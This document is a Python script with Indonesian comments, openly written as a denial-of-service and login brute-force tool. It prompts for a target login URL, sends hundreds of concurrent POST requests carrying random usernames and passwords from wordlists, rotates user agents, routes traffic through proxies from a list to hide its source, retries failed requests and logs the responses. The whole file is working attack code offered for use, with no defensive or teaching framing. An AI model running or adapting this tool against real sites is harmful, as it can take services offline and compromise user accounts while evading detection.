import aiohttp
import asyncio
import random
import os
from aiohttp import ClientSession, ClientTimeout, ClientConnectorError, ServerDisconnectedError
from urllib.parse import urlparse
import validators
import re
from aiohttp_socks import ProxyConnector
import python_socks

# Fungsi untuk membaca User-Agent dari file
def load_user_agents(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# Fungsi untuk membaca username dari file
def load_usernames(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# Fungsi untuk membaca password dari file dengan encoding iso-8859-1
def load_passwords(file_path):
    with open(file_path, "r", encoding="iso-8859-1") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# Memuat data dari file
user_agents = load_user_agents("user-agents.txt")
usernames = load_usernames("usernames.txt")
passwords = load_passwords("password.txt")

# Fungsi untuk menambahkan skema ke proxy jika tidak ada
def add_scheme_to_proxy(proxy_url):
    if not re.match(r'^(http://|https://|socks5://)', proxy_url):
        proxy_url = 'http://' + proxy_url  # Gunakan 'http://' sebagai default
    return proxy_url

# Fungsi untuk memilih User-Agent secara acak
def random_user_agent():
    return random.choice(user_agents)

# Fungsi untuk memilih username dan password secara acak
def random_credentials():
    username = random.choice(usernames)
    password = random.choice(passwords)
    return username, password

# Fungsi untuk membuat nama file berdasarkan target domain
def generate_filename_from_target(target_url, extension="txt"):
    domain = urlparse(target_url).netloc
    if not domain:
        raise ValueError("URL target tidak valid")
    output_folder = "dos-login"
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)
    base_name = os.path.join(output_folder, domain)
    counter = 1
    while os.path.exists(f"{base_name}-{counter}.{extension}"):
        counter += 1
    return f"{base_name}-{counter}.{extension}"

# Fungsi untuk menyimpan log ke file
def log_to_file(log_message, file_name):
    with open(file_name, "a") as f:
        f.write(log_message + "\n")

# Fungsi untuk mencoba HTTP jika HTTPS gagal
def fallback_to_http(target_url):
    parsed_url = urlparse(target_url)
    if parsed_url.scheme == "https":
        http_url = f"http://{parsed_url.netloc}{parsed_url.path}"
        print(f"Switching to HTTP: {http_url}")
        return http_url
    return target_url

# Fungsi untuk melakukan serangan DoS ke body web
async def dos_attack(target_url, session, log_file, retries=3, backoff_factor=2):
    headers = {
        "User-Agent": random_user_agent(),
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": target_url,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }
    username, password = random_credentials()
    payload = {"username": username, "password": password}

    for attempt in range(retries):
        try:
            async with session.post(target_url, data=payload, headers=headers) as response:
                log_message = f"Sent request to {target_url} with username={username}, status code: {response.status}"
                print(log_message)
                log_to_file(log_message, log_file)
                break
        except (ClientConnectorError, asyncio.TimeoutError) as e:
            if attempt < retries - 1:
                wait_time = random.uniform(1, 2) * (backoff_factor ** attempt)
                print(f"Koneksi gagal, mencoba ulang... ({attempt + 1}/{retries}), menunggu {wait_time:.2f} detik")
                await asyncio.sleep(wait_time)
            else:
                target_url = fallback_to_http(target_url)
                log_message = f"Gagal setelah {retries} percobaan: {e}"
                print(log_message)
                log_to_file(log_message, log_file)
        except ServerDisconnectedError as e:
            if attempt < retries - 1:
                wait_time = random.uniform(1, 2) * (backoff_factor ** attempt)
                print(f"Server terputus, mencoba ulang... ({attempt + 1}/{retries}), menunggu {wait_time:.2f} detik")
                await asyncio.sleep(wait_time)
            else:
                log_message = f"Server terputus setelah {retries} percobaan: {e}"
                print(log_message)
                log_to_file(log_message, log_file)

# Fungsi untuk membaca proxy dari file dan memvalidasi proxy
def load_proxies(file_path):
    with open(file_path, "r") as f:
        proxies = [line.strip() for line in f.readlines() if line.strip()]
    return [add_scheme_to_proxy(proxy) for proxy in proxies if add_scheme_to_proxy(proxy)]

# Fungsi untuk memilih proxy secara acak
def random_proxy(proxies):
    return random.choice(proxies) if proxies else None

# Fungsi untuk memulai serangan dengan banyak request
async def start_attack(target_url, num_requests, log_file, proxy=None):
    timeout = ClientTimeout(total=60, connect=60, sock_connect=60, sock_read=60)
    connector = aiohttp.TCPConnector(limit_per_host=500, ssl=False)
    if proxy:
        connector = ProxyConnector.from_url(proxy)  # Menggunakan ProxyConnector jika proxy ada

    async with ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for _ in range(num_requests):
            task = asyncio.create_task(dos_attack(target_url, session, log_file))
            tasks.append(task)

        await asyncio.gather(*tasks)

# Fungsi utama untuk menjalankan serangan
def main():
    target_url = input("Masukkan URL target LOGIN (contoh: https://example.com/): ").strip()
    num_requests = int(input("Masukkan jumlah permintaan (contoh: 500): ").strip())
    log_file = generate_filename_from_target(target_url)

    proxies = load_proxies("proxy-list.txt")
    proxy = random_proxy(proxies)

    print(f"Memulai serangan ke {target_url} dengan {num_requests} permintaan menggunakan proxy {proxy if proxy else 'tanpa proxy'}.")

    try:
        asyncio.run(start_attack(target_url, num_requests, log_file, proxy))
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")

if __name__ == "__main__":
    main()
